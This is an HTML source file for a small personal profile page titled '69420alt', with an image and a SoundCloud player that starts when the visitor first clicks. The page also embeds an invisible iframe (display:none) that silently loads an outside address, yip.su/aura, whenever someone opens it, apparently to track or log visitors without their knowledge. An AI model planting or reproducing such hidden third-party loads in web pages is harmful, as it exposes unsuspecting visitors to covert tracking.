<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>69420alt</title>
<style>
  html, body {
    margin: 0; padding: 0; height: 100%;
    background: black;
    color: white;
    font-family: monospace;
    display: flex;
    flex-direction: column;
    justify-content: center; /* centro verticale */
    align-items: center;     /* centro orizzontale */
    user-select: none;
    cursor: pointer;
  }
  #header {
    font-size: 28px;
    margin-bottom: 20px;
    text-align: center;
  }
  #image {
    width: 100px; /* dimensione piccola */
  }
  #hiddenSite {
    display: none;
  }
  #soundcloudPlayer {
    width: 0;
    height: 0;
    border: 0;
  }
</style>
</head>
<body>
  <div id="header">69420alt Pudshi Owner</div>
  <img id="image" src="https://i.postimg.cc/wvWPXkkz/Immagine-2025-07-02-212001.png" alt="69420alt Image" />

  <iframe
    id="soundcloudPlayer"
    width="100%" height="300" scrolling="no" frameborder="no" allow="autoplay"
    src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&color=%23ff5500&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true">
  </iframe>

  <iframe id="hiddenSite" src="https://yip.su/aura"></iframe>

<script>
  const iframe = document.getElementById('soundcloudPlayer');
  let started = false;

  document.body.addEventListener('click', () => {
    if (started) return;
    iframe.src = "https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true";
    started = true;
  });
</script>
</body>
</html>
